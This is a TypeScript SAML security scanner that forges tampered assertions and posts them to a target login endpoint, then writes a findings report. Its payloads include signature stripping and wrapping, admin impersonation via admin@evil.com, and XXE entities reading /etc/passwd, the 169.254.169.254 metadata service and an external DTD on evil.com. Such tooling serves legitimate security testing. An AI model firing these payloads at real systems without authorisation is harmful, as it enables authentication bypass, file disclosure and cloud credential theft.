import { createHash, randomBytes } from "crypto";

export interface SamlTestResult {
  testName: string;
  description: string;
  vulnerability: string;
  passed: boolean;
  severity: "critical" | "high" | "medium" | "low" | "info";
  details: string;
  manipulatedAssertion?: string;
  serverResponse?: {
    accepted: boolean;
    statusCode?: number;
    body?: string;
  };
  mitreAttackId?: string;
  recommendation?: string;
  cwe?: string;
}

export interface SamlTestConfig {
  acsUrl: string;
  originalAssertion: string;
  relayState?: string;
  headers?: Record<string, string>;
  timeoutMs?: number;
  testTypes?: SamlTestType[];
}

export type SamlTestType =
  | "signature_exclusion"
  | "signature_wrapping"
  | "assertion_replay"
  | "xml_injection"
  | "xxe_injection"
  | "comment_injection"
  | "attribute_manipulation"
  | "condition_bypass"
  | "destination_bypass";

export interface SamlAssertion {
  raw: string;
  issuer?: string;
  nameId?: string;
  sessionIndex?: string;
  notBefore?: Date;
  notOnOrAfter?: Date;
  audience?: string;
  attributes: Record<string, string[]>;
  signaturePresent: boolean;
  signatureValue?: string;
}

class SamlTester {
  async parseAssertion(samlResponse: string): Promise<SamlAssertion> {
    const decoded = this.decodeBase64(samlResponse);
    
    const issuerMatch = decoded.match(/<(?:saml2?:)?Issuer[^>]*>([^<]+)<\/(?:saml2?:)?Issuer>/);
    const nameIdMatch = decoded.match(/<(?:saml2?:)?NameID[^>]*>([^<]+)<\/(?:saml2?:)?NameID>/);
    const sessionMatch = decoded.match(/SessionIndex="([^"]+)"/);
    const notBeforeMatch = decoded.match(/NotBefore="([^"]+)"/);
    const notOnOrAfterMatch = decoded.match(/NotOnOrAfter="([^"]+)"/);
    const audienceMatch = decoded.match(/<(?:saml2?:)?Audience[^>]*>([^<]+)<\/(?:saml2?:)?Audience>/);
    
    const attributes: Record<string, string[]> = {};
    const attrRegex = /<(?:saml2?:)?Attribute[^>]*Name="([^"]+)"[^>]*>([\s\S]*?)<\/(?:saml2?:)?Attribute>/g;
    let attrMatch;
    while ((attrMatch = attrRegex.exec(decoded)) !== null) {
      const name = attrMatch[1];
      const valueRegex = /<(?:saml2?:)?AttributeValue[^>]*>([^<]*)<\/(?:saml2?:)?AttributeValue>/g;
      const values: string[] = [];
      let valueMatch;
      while ((valueMatch = valueRegex.exec(attrMatch[2])) !== null) {
        values.push(valueMatch[1]);
      }
      attributes[name] = values;
    }

    const signaturePresent = decoded.includes("<ds:Signature") || decoded.includes("<Signature");
    const sigValueMatch = decoded.match(/<(?:ds:)?SignatureValue[^>]*>([^<]+)<\/(?:ds:)?SignatureValue>/);

    return {
      raw: decoded,
      issuer: issuerMatch?.[1],
      nameId: nameIdMatch?.[1],
      sessionIndex: sessionMatch?.[1],
      notBefore: notBeforeMatch?.[1] ? new Date(notBeforeMatch[1]) : undefined,
      notOnOrAfter: notOnOrAfterMatch?.[1] ? new Date(notOnOrAfterMatch[1]) : undefined,
      audience: audienceMatch?.[1],
      attributes,
      signaturePresent,
      signatureValue: sigValueMatch?.[1],
    };
  }

  async runAllTests(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    const testTypes = config.testTypes || [
      "signature_exclusion",
      "signature_wrapping",
      "assertion_replay",
      "xml_injection",
      "xxe_injection",
      "comment_injection",
      "attribute_manipulation",
      "condition_bypass",
      "destination_bypass",
    ];

    for (const testType of testTypes) {
      const testResults = await this.runTest(testType, config);
      results.push(...testResults);
    }

    return results;
  }

  private async runTest(testType: SamlTestType, config: SamlTestConfig): Promise<SamlTestResult[]> {
    switch (testType) {
      case "signature_exclusion":
        return this.testSignatureExclusion(config);
      case "signature_wrapping":
        return this.testSignatureWrapping(config);
      case "assertion_replay":
        return this.testAssertionReplay(config);
      case "xml_injection":
        return this.testXmlInjection(config);
      case "xxe_injection":
        return this.testXxeInjection(config);
      case "comment_injection":
        return this.testCommentInjection(config);
      case "attribute_manipulation":
        return this.testAttributeManipulation(config);
      case "condition_bypass":
        return this.testConditionBypass(config);
      case "destination_bypass":
        return this.testDestinationBypass(config);
      default:
        return [];
    }
  }

  private async testSignatureExclusion(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const noSignature = decoded
        .replace(/<ds:Signature[\s\S]*?<\/ds:Signature>/g, "")
        .replace(/<Signature[\s\S]*?<\/Signature>/g, "");

      const noSigEncoded = this.encodeBase64(noSignature);
      const response = await this.testAssertion(config.acsUrl, noSigEncoded, config);

      results.push({
        testName: "Signature Removal",
        description: "Tests if SAML assertion is accepted without signature",
        vulnerability: "SAML Signature Bypass",
        passed: !response.accepted,
        severity: "critical",
        details: response.accepted
          ? "Server accepted SAML assertion without signature - complete authentication bypass"
          : "Server correctly rejected unsigned assertion",
        manipulatedAssertion: noSigEncoded.slice(0, 200),
        serverResponse: response,
        mitreAttackId: "T1606.002",
        cwe: "CWE-347",
        recommendation: "Always validate SAML signatures and reject unsigned assertions",
      });

      const emptySignature = decoded.replace(
        /<(?:ds:)?SignatureValue[^>]*>[^<]+<\/(?:ds:)?SignatureValue>/,
        "<ds:SignatureValue></ds:SignatureValue>"
      );

      const emptyEncoded = this.encodeBase64(emptySignature);
      const emptyResponse = await this.testAssertion(config.acsUrl, emptyEncoded, config);

      results.push({
        testName: "Empty Signature Value",
        description: "Tests if SAML assertion is accepted with empty signature",
        vulnerability: "SAML Signature Bypass",
        passed: !emptyResponse.accepted,
        severity: "critical",
        details: emptyResponse.accepted
          ? "Server accepted SAML assertion with empty signature"
          : "Server correctly rejected assertion with empty signature",
        manipulatedAssertion: emptyEncoded.slice(0, 200),
        serverResponse: emptyResponse,
        mitreAttackId: "T1606.002",
        cwe: "CWE-347",
        recommendation: "Validate signature value is present and cryptographically valid",
      });
    } catch (error: any) {
      results.push({
        testName: "Signature Exclusion Test",
        description: "Could not complete signature exclusion testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testSignatureWrapping(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const assertionMatch = decoded.match(/<(?:saml2?:)?Assertion[\s\S]*?<\/(?:saml2?:)?Assertion>/);
      if (assertionMatch) {
        const originalAssertion = assertionMatch[0];
        
        const modifiedAssertion = originalAssertion
          .replace(/<(?:saml2?:)?NameID[^>]*>[^<]+<\/(?:saml2?:)?NameID>/, 
                   '<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@evil.com</saml:NameID>');

        const wrappedXml = decoded.replace(
          originalAssertion,
          `${modifiedAssertion}<!-- Original: ${originalAssertion} -->`
        );

        const wrappedEncoded = this.encodeBase64(wrappedXml);
        const response = await this.testAssertion(config.acsUrl, wrappedEncoded, config);

        results.push({
          testName: "XSW Attack - Comment Wrapping",
          description: "Tests for XML Signature Wrapping via comment injection",
          vulnerability: "SAML XSW (XML Signature Wrapping)",
          passed: !response.accepted,
          severity: "critical",
          details: response.accepted
            ? "Server vulnerable to XSW attack - malicious assertion may be processed"
            : "Server correctly handled XSW attempt",
          manipulatedAssertion: wrappedEncoded.slice(0, 200),
          serverResponse: response,
          mitreAttackId: "T1606.002",
          cwe: "CWE-347",
          recommendation: "Use exclusive canonicalization and validate assertion structure before processing",
        });
      }

      const xswVariants = [
        {
          name: "XSW1 - Duplicate Response",
          transform: (xml: string) => {
            const responseMatch = xml.match(/<(?:samlp?:)?Response[\s\S]*?<\/(?:samlp?:)?Response>/);
            if (responseMatch) {
              return `<root>${responseMatch[0]}${responseMatch[0]}</root>`;
            }
            return xml;
          }
        },
        {
          name: "XSW2 - Detached Signature",
          transform: (xml: string) => {
            const sigMatch = xml.match(/<ds:Signature[\s\S]*?<\/ds:Signature>/);
            if (sigMatch) {
              return xml.replace(sigMatch[0], "") + sigMatch[0];
            }
            return xml;
          }
        },
      ];

      for (const variant of xswVariants) {
        const transformed = variant.transform(decoded);
        if (transformed !== decoded) {
          const encoded = this.encodeBase64(transformed);
          const response = await this.testAssertion(config.acsUrl, encoded, config);

          if (response.accepted) {
            results.push({
              testName: variant.name,
              description: `Tests for ${variant.name} vulnerability`,
              vulnerability: "SAML XSW",
              passed: false,
              severity: "critical",
              details: `Server vulnerable to ${variant.name} attack`,
              manipulatedAssertion: encoded.slice(0, 200),
              serverResponse: response,
              mitreAttackId: "T1606.002",
              cwe: "CWE-347",
              recommendation: "Implement proper XSW protections in SAML library",
            });
          }
        }
      }
    } catch (error: any) {
      results.push({
        testName: "Signature Wrapping Test",
        description: "Could not complete signature wrapping testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testAssertionReplay(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const response1 = await this.testAssertion(config.acsUrl, config.originalAssertion, config);
      const response2 = await this.testAssertion(config.acsUrl, config.originalAssertion, config);

      const bothAccepted = response1.accepted && response2.accepted;

      results.push({
        testName: "Assertion Replay Attack",
        description: "Tests if the same SAML assertion can be used multiple times",
        vulnerability: "SAML Assertion Replay",
        passed: !bothAccepted,
        severity: "high",
        details: bothAccepted
          ? "Server accepted the same assertion twice - vulnerable to replay attacks"
          : response1.accepted
          ? "Server correctly rejected replayed assertion"
          : "First assertion was also rejected",
        serverResponse: response2,
        mitreAttackId: "T1550.001",
        cwe: "CWE-294",
        recommendation: "Implement assertion ID tracking and reject previously-used assertions",
      });
    } catch (error: any) {
      results.push({
        testName: "Assertion Replay Test",
        description: "Could not complete replay testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testXmlInjection(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const injections = [
        {
          name: "CDATA Injection",
          find: /<(?:saml2?:)?NameID[^>]*>([^<]+)<\/(?:saml2?:)?NameID>/,
          replace: '<saml:NameID><![CDATA[admin@evil.com]]></saml:NameID>',
        },
        {
          name: "Entity Injection",
          find: /<(?:saml2?:)?NameID[^>]*>([^<]+)<\/(?:saml2?:)?NameID>/,
          replace: '<saml:NameID>&admin;</saml:NameID>',
        },
        {
          name: "Namespace Confusion",
          find: /<(?:saml2?:)?Assertion/,
          replace: '<saml:Assertion xmlns:evil="http://evil.com"',
        },
      ];

      for (const injection of injections) {
        const injected = decoded.replace(injection.find, injection.replace);
        const encoded = this.encodeBase64(injected);
        const response = await this.testAssertion(config.acsUrl, encoded, config);

        if (response.accepted || (response.statusCode === 500)) {
          results.push({
            testName: `XML Injection - ${injection.name}`,
            description: `Tests for ${injection.name} vulnerability`,
            vulnerability: "XML Injection",
            passed: false,
            severity: response.statusCode === 500 ? "high" : "critical",
            details: response.statusCode === 500
              ? `Server error on ${injection.name} - may indicate parsing vulnerability`
              : `Server accepted ${injection.name}`,
            manipulatedAssertion: encoded.slice(0, 200),
            serverResponse: response,
            mitreAttackId: "T1059.007",
            cwe: "CWE-91",
            recommendation: "Use secure XML parser with proper entity handling",
          });
        }
      }
    } catch (error: any) {
      results.push({
        testName: "XML Injection Test",
        description: "Could not complete XML injection testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testXxeInjection(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const xxePayloads = [
        {
          name: "File Read XXE",
          doctype: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
          entity: "&xxe;",
        },
        {
          name: "SSRF XXE",
          doctype: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
          entity: "&xxe;",
        },
        {
          name: "Parameter Entity XXE",
          doctype: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]>',
          entity: "",
        },
        {
          name: "Blind XXE via Error",
          doctype: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>',
          entity: "&xxe;",
        },
      ];

      for (const payload of xxePayloads) {
        let injected = decoded;
        
        if (decoded.includes("<?xml")) {
          injected = decoded.replace(/<\?xml[^?]*\?>/, `<?xml version="1.0"?>${payload.doctype}`);
        } else {
          injected = `<?xml version="1.0"?>${payload.doctype}${decoded}`;
        }

        if (payload.entity) {
          injected = injected.replace(
            /<(?:saml2?:)?NameID[^>]*>([^<]+)<\/(?:saml2?:)?NameID>/,
            `<saml:NameID>${payload.entity}</saml:NameID>`
          );
        }

        const encoded = this.encodeBase64(injected);
        const response = await this.testAssertion(config.acsUrl, encoded, config);

        const isVulnerable = response.accepted || 
          (response.body && (
            response.body.includes("root:") ||
            response.body.includes("169.254") ||
            response.body.includes("meta-data")
          )) ||
          response.statusCode === 500;

        if (isVulnerable) {
          results.push({
            testName: `XXE - ${payload.name}`,
            description: `Tests for ${payload.name} vulnerability`,
            vulnerability: "XML External Entity (XXE)",
            passed: false,
            severity: "critical",
            details: response.body?.includes("root:") 
              ? "Server vulnerable to XXE - file contents exposed"
              : response.statusCode === 500
              ? "Server error on XXE payload - may indicate vulnerability"
              : "Server may be vulnerable to XXE",
            manipulatedAssertion: encoded.slice(0, 200),
            serverResponse: response,
            mitreAttackId: "T1059.007",
            cwe: "CWE-611",
            recommendation: "Disable external entity processing in XML parser",
          });
        }
      }

      if (results.filter(r => !r.passed).length === 0) {
        results.push({
          testName: "XXE Injection Tests",
          description: "Tested various XXE payloads",
          vulnerability: "XXE",
          passed: true,
          severity: "info",
          details: "No XXE vulnerabilities detected",
        });
      }
    } catch (error: any) {
      results.push({
        testName: "XXE Injection Test",
        description: "Could not complete XXE testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testCommentInjection(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const commentInjected = decoded.replace(
        /<(?:saml2?:)?NameID[^>]*>([^<]+)<\/(?:saml2?:)?NameID>/,
        '<saml:NameID>admin@evil.com<!--$1--></saml:NameID>'
      );

      const encoded = this.encodeBase64(commentInjected);
      const response = await this.testAssertion(config.acsUrl, encoded, config);

      results.push({
        testName: "Comment Truncation Attack",
        description: "Tests if XML comments can be used to manipulate parsed values",
        vulnerability: "SAML Comment Injection",
        passed: !response.accepted,
        severity: "high",
        details: response.accepted
          ? "Server may be vulnerable to comment truncation attack"
          : "Server correctly rejected comment-injected assertion",
        manipulatedAssertion: encoded.slice(0, 200),
        serverResponse: response,
        mitreAttackId: "T1606.002",
        cwe: "CWE-74",
        recommendation: "Validate signature covers entire assertion including text nodes",
      });
    } catch (error: any) {
      results.push({
        testName: "Comment Injection Test",
        description: "Could not complete comment injection testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testAttributeManipulation(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const adminAttribute = `
        <saml:Attribute Name="role">
          <saml:AttributeValue>admin</saml:AttributeValue>
        </saml:Attribute>
      `;

      const injected = decoded.replace(
        /<(?:saml2?:)?AttributeStatement/,
        `<saml:AttributeStatement>${adminAttribute}`
      );

      const encoded = this.encodeBase64(injected);
      const response = await this.testAssertion(config.acsUrl, encoded, config);

      results.push({
        testName: "Attribute Injection - Admin Role",
        description: "Tests if additional admin attributes can be injected",
        vulnerability: "SAML Attribute Manipulation",
        passed: !response.accepted,
        severity: "critical",
        details: response.accepted
          ? "Server accepted assertion with injected admin attribute"
          : "Server correctly rejected manipulated assertion",
        manipulatedAssertion: encoded.slice(0, 200),
        serverResponse: response,
        mitreAttackId: "T1606.002",
        cwe: "CWE-347",
        recommendation: "Validate assertion signature before processing attributes",
      });
    } catch (error: any) {
      results.push({
        testName: "Attribute Manipulation Test",
        description: "Could not complete attribute manipulation testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testConditionBypass(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const futureDate = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString();
      const pastDate = new Date(Date.now() - 365 * 24 * 60 * 60 * 1000).toISOString();

      const extendedValidity = decoded
        .replace(/NotOnOrAfter="[^"]+"/g, `NotOnOrAfter="${futureDate}"`)
        .replace(/NotBefore="[^"]+"/g, `NotBefore="${pastDate}"`);

      const encoded = this.encodeBase64(extendedValidity);
      const response = await this.testAssertion(config.acsUrl, encoded, config);

      results.push({
        testName: "Condition Bypass - Extended Validity",
        description: "Tests if assertion validity period can be extended",
        vulnerability: "SAML Condition Bypass",
        passed: !response.accepted,
        severity: "high",
        details: response.accepted
          ? "Server accepted assertion with modified validity period - signature validation may be bypassed"
          : "Server correctly rejected assertion with modified conditions",
        manipulatedAssertion: encoded.slice(0, 200),
        serverResponse: response,
        mitreAttackId: "T1550.001",
        cwe: "CWE-347",
        recommendation: "Validate signature before checking condition timestamps",
      });

      const noConditions = decoded.replace(
        /<(?:saml2?:)?Conditions[\s\S]*?<\/(?:saml2?:)?Conditions>/g,
        ""
      );

      const noCondEncoded = this.encodeBase64(noConditions);
      const noCondResponse = await this.testAssertion(config.acsUrl, noCondEncoded, config);

      results.push({
        testName: "Condition Removal",
        description: "Tests if assertion is accepted without Conditions element",
        vulnerability: "SAML Condition Bypass",
        passed: !noCondResponse.accepted,
        severity: "high",
        details: noCondResponse.accepted
          ? "Server accepted assertion without Conditions element"
          : "Server correctly rejected assertion without conditions",
        manipulatedAssertion: noCondEncoded.slice(0, 200),
        serverResponse: noCondResponse,
        mitreAttackId: "T1550.001",
        cwe: "CWE-347",
        recommendation: "Require and validate Conditions element in assertions",
      });
    } catch (error: any) {
      results.push({
        testName: "Condition Bypass Test",
        description: "Could not complete condition bypass testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testDestinationBypass(config: SamlTestConfig): Promise<SamlTestResult[]> {
    const results: SamlTestResult[] = [];

    try {
      const decoded = this.decodeBase64(config.originalAssertion);

      const modifiedDestination = decoded.replace(
        /Destination="[^"]+"/g,
        'Destination="https://evil.com/acs"'
      );

      const encoded = this.encodeBase64(modifiedDestination);
      const response = await this.testAssertion(config.acsUrl, encoded, config);

      results.push({
        testName: "Destination Mismatch",
        description: "Tests if assertion with wrong Destination is accepted",
        vulnerability: "SAML Destination Bypass",
        passed: !response.accepted,
        severity: "high",
        details: response.accepted
          ? "Server accepted assertion with mismatched Destination - may be vulnerable to assertion stealing"
          : "Server correctly validated Destination attribute",
        manipulatedAssertion: encoded.slice(0, 200),
        serverResponse: response,
        mitreAttackId: "T1557",
        cwe: "CWE-352",
        recommendation: "Validate Destination matches the ACS URL before processing",
      });

      const noDestination = decoded.replace(/\s*Destination="[^"]+"/g, "");
      const noDestEncoded = this.encodeBase64(noDestination);
      const noDestResponse = await this.testAssertion(config.acsUrl, noDestEncoded, config);

      results.push({
        testName: "Missing Destination",
        description: "Tests if assertion without Destination is accepted",
        vulnerability: "SAML Destination Bypass",
        passed: !noDestResponse.accepted,
        severity: "medium",
        details: noDestResponse.accepted
          ? "Server accepted assertion without Destination attribute"
          : "Server correctly requires Destination attribute",
        manipulatedAssertion: noDestEncoded.slice(0, 200),
        serverResponse: noDestResponse,
        mitreAttackId: "T1557",
        cwe: "CWE-352",
        recommendation: "Require Destination attribute in all SAML responses",
      });
    } catch (error: any) {
      results.push({
        testName: "Destination Bypass Test",
        description: "Could not complete destination bypass testing",
        vulnerability: "N/A",
        passed: true,
        severity: "info",
        details: `Error during testing: ${error.message}`,
      });
    }

    return results;
  }

  private async testAssertion(
    acsUrl: string,
    assertion: string,
    config: SamlTestConfig
  ): Promise<{ accepted: boolean; statusCode?: number; body?: string }> {
    try {
      const formData = new URLSearchParams();
      formData.append("SAMLResponse", assertion);
      if (config.relayState) {
        formData.append("RelayState", config.relayState);
      }

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), config.timeoutMs || 10000);

      const response = await fetch(acsUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          ...config.headers,
        },
        body: formData.toString(),
        redirect: "manual",
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      const body = await response.text();
      const accepted = response.status >= 200 && response.status < 400;

      return { accepted, statusCode: response.status, body: body.slice(0, 1000) };
    } catch (error: any) {
      return { accepted: false, body: `Error: ${error.message}` };
    }
  }

  private encodeBase64(str: string): string {
    return Buffer.from(str).toString("base64");
  }

  private decodeBase64(str: string): string {
    return Buffer.from(str, "base64").toString("utf-8");
  }

  generateReport(results: SamlTestResult[]): string {
    const lines: string[] = [
      "# SAML Security Test Report",
      "",
      `**Generated:** ${new Date().toISOString()}`,
      "",
      "## Summary",
      "",
      `| Metric | Value |`,
      `|--------|-------|`,
      `| Total Tests | ${results.length} |`,
      `| Passed | ${results.filter(r => r.passed).length} |`,
      `| Failed | ${results.filter(r => !r.passed).length} |`,
      `| Critical Issues | ${results.filter(r => !r.passed && r.severity === "critical").length} |`,
      `| High Issues | ${results.filter(r => !r.passed && r.severity === "high").length} |`,
      "",
    ];

    const criticals = results.filter(r => !r.passed && r.severity === "critical");
    if (criticals.length > 0) {
      lines.push("## Critical Vulnerabilities", "");
      for (const finding of criticals) {
        lines.push(`### ${finding.testName}`);
        lines.push(`- **Vulnerability:** ${finding.vulnerability}`);
        lines.push(`- **CWE:** ${finding.cwe || "N/A"}`);
        lines.push(`- **MITRE ATT&CK:** ${finding.mitreAttackId || "N/A"}`);
        lines.push(`- **Details:** ${finding.details}`);
        lines.push(`- **Recommendation:** ${finding.recommendation || "N/A"}`);
        lines.push("");
      }
    }

    const highs = results.filter(r => !r.passed && r.severity === "high");
    if (highs.length > 0) {
      lines.push("## High Severity Issues", "");
      for (const finding of highs) {
        lines.push(`### ${finding.testName}`);
        lines.push(`- **Vulnerability:** ${finding.vulnerability}`);
        lines.push(`- **Details:** ${finding.details}`);
        lines.push(`- **Recommendation:** ${finding.recommendation || "N/A"}`);
        lines.push("");
      }
    }

    lines.push("## All Test Results", "");
    lines.push("| Test | Status | Severity |");
    lines.push("|------|--------|----------|");
    for (const result of results) {
      const status = result.passed ? "PASS" : "FAIL";
      lines.push(`| ${result.testName} | ${status} | ${result.severity} |`);
    }

    return lines.join("\n");
  }
}

export const samlTester = new SamlTester();
